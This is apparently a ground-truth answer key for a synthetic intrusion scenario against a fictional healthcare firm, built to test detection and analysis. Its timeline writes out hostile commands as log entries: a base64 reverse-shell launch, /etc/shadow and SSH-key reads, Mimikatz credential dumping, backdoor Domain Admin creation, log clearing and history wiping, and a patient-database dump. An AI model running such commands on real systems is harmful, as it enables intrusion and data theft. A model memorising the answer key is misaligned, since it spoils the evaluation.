# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:47 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:17:45 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CZtZA79iJTanz1Mm8P0) |
| 2024-03-18 12:23:57 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:27 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:28 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:04 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (414 requests) |
| 2024-03-18 12:45:04 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:24 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:55 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: C5f0eZ7GlssJz9yaqm) |
| 2024-03-18 12:59:46 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CPVaBvdGZpVybzyBmx) |
| 2024-03-18 12:59:46 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CILY5ypYgxIfe7Yp04) |
| 2024-03-18 13:19:55 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C4djMHp1m62multLwl) |
| 2024-03-18 13:19:56 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581413) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:57 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CQfwrCUjUb7KCZp6S9) |
| 2024-03-18 13:19:58 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:35 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584261) - `ip addr show` |
| 2024-03-18 13:39:40 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584304) - `cat /etc/hosts` |
| 2024-03-18 13:39:52 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584755) - `cat /etc/resolv.conf` |
| 2024-03-18 13:43:09 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584887) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:44:04 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584903) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:44:17 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585413) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:50:01 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:53 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 14:00:26 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587186) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:27 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587298) - `ls -la /root/.ssh` |
| 2024-03-18 14:01:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587407) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:18 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: Crg0DFACqt5dBMKLAIW) |
| 2024-03-18 14:15:18 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: Cnv4ETsQm7BAFrynO3c) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:36 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962104) - `cat /etc/passwd` |
| 2024-03-18 14:34:41 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962133) - `cat /etc/shadow` |
| 2024-03-18 14:49:57 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:58:52 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:06 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: C9YuQrfLkvTupaZzflN) |
| 2024-03-18 15:07:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:34 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: C2tTKEG8yhpO44MX3g3) |
| 2024-03-18 15:20:12 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27010f0) |
| 2024-03-18 15:20:13 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6816) - `whoami /all` |
| 2024-03-18 15:20:15 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6828) - `net user /domain` |
| 2024-03-18 15:20:15 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6852) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:17 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:17 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6868) - `net view /domain` |
| 2024-03-18 15:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CwrSCCW4Z87Y2PCALP7) |
| 2024-03-18 15:45:26 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6872) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:28 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:36 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:42 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5553165) |
| 2024-03-18 15:59:55 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:56 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5472) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:58 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5480) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:56 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:08 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5504) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:10 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:12 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5516) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:22 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:01 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5572) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:03 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5584) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:03 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:05 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:21 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:26 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:45:14 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 267 queries, 1401 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=266 emitted=6 filtered=260] |
| 2024-03-18 16:50:00 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:01 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=180 emitted=18 filtered=162] |
| 2024-03-18 17:00:55 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf884a55) |
| 2024-03-18 17:00:57 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5576) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:58 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5604) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:32 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CLLM52TL99CiTaERkJ) |
| 2024-03-18 17:14:33 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158338) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:16:30 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159171) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:21:17 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159695) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:24:41 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: C06giQHABY3j1aTnr) |
| 2024-03-18 17:30:28 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:02 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608785) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:17 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982891) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:13 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5800) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:14 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5824) - `wevtutil cl Security` |
| 2024-03-18 17:42:17 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:44:56 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:58 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:58 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:56 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5852) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:57 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:47 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:14 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 004194c0-81be-4cc9-8c5a-0c7ec0a9f29d | ids | delayed: 1 |
| 046f4e93-3710-4eb4-b32f-908a510c3b04 | ids | delayed: 1 |
| 07bf2844-873b-42ef-815d-13208d9324c4 | ids | delayed: 1 |
| 07f7bc14-430e-407b-b108-75e78e601cac | ids | delayed: 2 |
| 0985dddf-3ad0-4fb1-a968-0ab9b8797b5b | ids | delayed: 2 |
| 0b3bf197-8c18-4b1c-9c1d-27f5c2d2e8f4 | ids | delayed: 1 |
| 0d23662d-bffb-479a-bdd8-38bf3d404fa9 | ids | delayed: 1 |
| 0d9a9458-878e-44e0-a64e-300b5fd06d76 | ids | delayed: 1 |
| 0effa032-bbe2-4b11-83ab-f0d8fb83e6ab | ids | delayed: 1 |
| 11a061ed-a1d5-4349-86e3-40118f74aec3 | ids | delayed: 1 |
| 138dc9f7-5c6e-4963-b05d-44592827afae | ids | delayed: 1 |
| 13d61423-54ef-4a55-b392-955f6190bc0d | ids | delayed: 1 |
| 1a774e84-db64-4fbb-aa61-7f9cfe680d9e | ids | delayed: 2 |
| 1a937c50-744d-4218-8efd-7ea1ad3d61df | ids | delayed: 2 |
| 20d79161-7639-4733-a342-facf0f2ad995 | ids | delayed: 1 |
| 211de2e5-4a9d-4eaa-954c-ea8adc95c1c9 | ids | delayed: 2 |
| 220a53fa-a630-4620-afd5-9aa7af6ce900 | ids | delayed: 1 |
| 24479493-bdf1-4d70-9f5c-ce6c19c86e9b | ids | delayed: 1 |
| 26563eb9-afb2-4b6b-b628-0c0094d065a2 | ids | delayed: 1 |
| 27067413-b64a-4099-aedf-c2e68071007c | ids | delayed: 2 |
| 289ee56a-7417-419a-9a32-21a6948662ad | ids | delayed: 1 |
| 29031dbb-329a-40e5-820a-d325855d2f03 | ids | delayed: 1 |
| 2c008b00-62f8-4fae-b8ff-0088e43894f2 | ids | delayed: 1 |
| 31f1afd4-87cc-4a36-bff6-59ae9dae36a2 | ids | delayed: 1 |
| 35ab9d8b-e9c7-4bd3-bc44-36bd3df58b44 | ids | delayed: 1 |
| 38e85526-fcfd-4f7b-8db9-856386ba30e8 | ids | delayed: 1 |
| 3e86a1b0-ee09-4949-b6fe-0610db43efe3 | ids | delayed: 1 |
| 405f56d0-e201-436d-bfff-7fa2f0c877a6 | ids | delayed: 1 |
| 5017110e-0bc7-4fbf-ad13-54d63f34e1ed | ids | delayed: 1 |
| 50348fe3-969b-4c14-8e87-584b58be1e3e | ids | delayed: 1 |
| 570cae40-2c00-4614-94ea-a8b4a5a9e8ff | ids | delayed: 1 |
| 5762eef1-f37e-496f-88aa-e752206f87e8 | ids | delayed: 1 |
| 5853ba44-f431-4eca-bdc6-5fcc8265461f | ids | delayed: 2 |
| 5bf16529-520d-4888-8ecf-3d6436a253ac | ids | delayed: 1 |
| 5c7e756a-19a9-4e24-883c-f6a9ee1d897f | ids | delayed: 1 |
| 5d4ce2ee-f81d-40d6-b372-9f764e6388ce | ids | delayed: 1 |
| 5df8cec7-6028-45ca-82fd-c160c41e9fa1 | ids | delayed: 2 |
| 5e96fced-57cd-4345-a318-88e695c2a512 | ids | delayed: 1 |
| 60db5691-7167-4150-9961-bc56ac93dc14 | ids | delayed: 1 |
| 64a8af8d-94be-44be-8452-602351c2a1b3 | ids | visible: 1 |
| 64fc22e8-cab2-4dca-81b2-6293879ef9ef | ids | delayed: 2 |
| 66d3249b-1401-4240-84cd-199a4f65d8b5 | ids | delayed: 1 |
| 695f57c9-9fa1-453e-8d45-47b7b86a6ece | ids | delayed: 1 |
| 6ace8f5a-1055-42fb-b4a9-7f0acb389e13 | ids | delayed: 1 |
| 6d3f780e-1779-4fcc-bb81-eee38f361373 | ids | delayed: 1 |
| 705e1a4e-71e0-410e-bfb5-7ba8fa090d92 | ids | delayed: 1 |
| 710d1f19-2ff3-46c1-a336-2e4d3055559a | ids | delayed: 1 |
| 77ae3e9d-c400-463b-b619-726c46f2c30a | ids | delayed: 1 |
| 7ae3ede4-49f5-4f24-8aef-194a124a1b87 | ids | delayed: 2 |
| 7b964711-fb9d-4bd0-bd4c-ca0c8a39ceb6 | ids | delayed: 1 |
| 7c11ae07-afad-4f8d-b60d-20de44968e07 | ids | delayed: 1 |
| 7d89c7de-16f8-45b2-a27a-3589593d40cc | ids | delayed: 1 |
| 8118005c-da7b-4748-b93e-d089a8289192 | ids | delayed: 1 |
| 820d2126-2c24-46ac-b40d-738935febd11 | ids | delayed: 1 |
| 87def230-b590-4fd2-9b72-1d61e22a9d37 | ids | delayed: 1 |
| 891f5c19-91ec-448d-856c-61276520a46f | ids | delayed: 1 |
| 898d1073-13c5-4504-ad98-473559d3746c | ids | delayed: 1 |
| 8abbeecc-857b-4164-abf2-4dfe0cf7c2fa | ids | delayed: 1 |
| 8b7bde58-4bd5-4826-bcfc-5cec3d3d254c | ids | delayed: 1 |
| 8b8c874b-82d3-4959-ae52-2c39310a4d4d | ids | delayed: 1 |
| 8df759d8-6c29-47d8-bbee-075f10a47187 | ids | delayed: 2 |
| 8e31531a-6716-4c52-9e47-6dcb37a20f7c | ids | delayed: 1 |
| 97482685-9f09-455d-bc3b-18a8087afedd | ids | delayed: 1 |
| 99d6a841-08b7-4175-9c93-cd9e34fe570e | ids | delayed: 1 |
| 9a15e680-1cac-4751-b455-75013554e967 | ids | delayed: 1 |
| 9e209533-e090-4a5f-94db-10a8e58bd247 | ids | delayed: 1 |
| 9ff82b93-6a51-401e-9c60-3e1bbd87bbfa | ids | delayed: 1 |
| a059b55c-9552-4faf-844d-ead352702f34 | ids | delayed: 1 |
| a20c1c37-1ed6-4c17-8cbe-db669deb52bd | ids | delayed: 1 |
| a54d65ca-bf4b-434e-a215-47c1ff588f53 | ids | delayed: 1 |
| a8160ee8-2243-446c-a426-034d7cd02460 | ids | delayed: 1 |
| a8b2ef8e-da1d-49a5-9ccb-de4c4a07fcf0 | ids | visible: 2 |
| ac5b36b1-743e-4034-9eb9-6d64dfa8dc56 | ids | delayed: 1 |
| b5149f94-52c8-4ae0-9f56-74d147ebde13 | ids | delayed: 1 |
| b7c5ec4e-9690-4c92-89bb-ed45e0824a01 | ids | delayed: 1 |
| b8e9c27b-169c-48cb-8a57-f93be1a7cf71 | ids | delayed: 1 |
| ba1a26fd-3463-4142-a0c1-17ac263c23b9 | ids | delayed: 1 |
| ba5862af-ece1-41ad-a51f-07b467bbfb0b | ids | delayed: 1 |
| c02e9a7e-6370-409a-83c1-ea0d1a789dd6 | ids | delayed: 1 |
| c33f38d0-429c-4655-92dc-c9a9563aa429 | ids | delayed: 1 |
| c423b5dd-f366-4c68-9ac5-916a7e2c3d15 | ids | delayed: 1 |
| c499b9c6-dd74-494e-a991-b2ba5a61e2f2 | ids | delayed: 2 |
| c4c400b9-691b-4e80-ae97-4ddc870b7313 | ids | delayed: 1 |
| c9d979c7-587d-4fba-91b0-c80bb9b813f1 | ids | delayed: 1 |
| ca2ee371-d233-4079-9f97-ddfbee91cb0f | ids | delayed: 1 |
| cd0f9e0a-874a-45b4-b24b-b92076985b7e | ids | delayed: 1 |
| d9ae4fb0-63ba-4884-82fd-5885875e4707 | ids | delayed: 2 |
| dcd57150-ff64-49b1-9dc9-30019fd2c0c9 | ids | delayed: 1 |
| ddf45159-d87d-4e8e-ba3d-0aa3534516da | ids | delayed: 1 |
| df0441b4-9d20-4fde-8762-79c6cbfff729 | ids | delayed: 1 |
| e042c9c8-d400-4a8d-bf7f-061c61b661ce | ids | delayed: 1 |
| e4dea7bc-83f5-4f23-b4cd-cb14e3a834d6 | ids | delayed: 1 |
| e6c559a2-c15f-45f7-a741-9e5e7e2eab24 | ids | delayed: 1 |
| e90a923d-dbf2-4798-a32c-a6656a5ce887 | ids | delayed: 1 |
| ea3396c3-6274-453d-93cf-3d98a66fcccf | ids | delayed: 1 |
| ebf9e082-ad48-4439-968d-e8f865099cf1 | ids | delayed: 1 |
| ec36fa51-e97c-4cf8-b631-31587c87ccdf | ids | delayed: 1 |
| edd3b2eb-4261-4f97-be75-5a0ec3157f1e | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 3, filtered: 4 |
| evt-002 | asa | delayed: 410, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 409, dropped: 5 |
| evt-002 | ids | delayed: 15, visible: 1 |
| evt-002 | web | delayed: 357, visible: 1 |
| evt-002 | zeek | delayed: 582, dropped: 1, filtered: 2, visible: 188 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
